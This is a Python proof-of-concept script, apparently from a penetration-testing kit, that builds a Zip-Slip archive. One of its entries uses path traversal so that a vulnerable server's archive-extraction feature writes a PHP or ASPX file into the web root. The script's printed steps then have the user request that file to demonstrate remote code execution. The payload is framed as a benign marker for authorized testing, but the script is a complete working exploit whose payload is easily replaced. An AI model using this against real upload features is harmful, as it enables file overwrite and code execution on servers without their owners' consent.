#!/usr/bin/env python3
"""
make_zipslip.py — build a BENIGN Zip-Slip archive (guide §17).
A zip entry whose name traverses out of the extraction directory; on unzip the server writes the
payload OUTSIDE the intended folder (e.g. into the web root) -> RCE / overwrite.

AUTHORIZED TESTING ONLY. The payload is a BENIGN marker (prints a token if executed), not a backdoor.
Adjust the traversal depth/target to the real layout you confirmed. Delete extracted files after.

Usage:
  python3 make_zipslip.py                       # default: ../../../../var/www/html/zs_poc.php
  python3 make_zipslip.py --target ../../../../var/www/html/zs_poc.php
  python3 make_zipslip.py --target "..\\..\\..\\inetpub\\wwwroot\\zs_poc.aspx" --aspx
"""
import argparse
import hashlib
import zipfile

ap = argparse.ArgumentParser()
ap.add_argument("--target", default="../../../../var/www/html/zs_poc.php",
                help="traversal path of the entry (where it should land on extraction)")
ap.add_argument("--out", default="zipslip.zip")
ap.add_argument("--aspx", action="store_true", help="emit an ASPX marker instead of PHP")
args = ap.parse_args()

mark = "RCE-POC-" + hashlib.md5(b"yourhandle-unique-2026").hexdigest()
if args.aspx:
    payload = '<%@ Page Language="C#" %><%= "' + mark + '-" + System.Environment.MachineName %>'
else:
    payload = '<?php echo "' + mark + '-".php_uname("n"); ?>'

with zipfile.ZipFile(args.out, "w", zipfile.ZIP_DEFLATED) as z:
    z.writestr("harmless.txt", "benign zip-slip PoC\n")   # a normal-looking entry
    z.writestr(args.target, payload)                       # the traversal entry

print(f"[+] wrote {args.out}")
print(f"    traversal entry: {args.target}")
print(f"    marker: {mark}")
print("[i] Upload to an 'extract archive' feature; if it lands in the web root, request it -> RCE (guide §17).")
print("[i] DELETE the extracted file after proving it. Authorized testing only.")
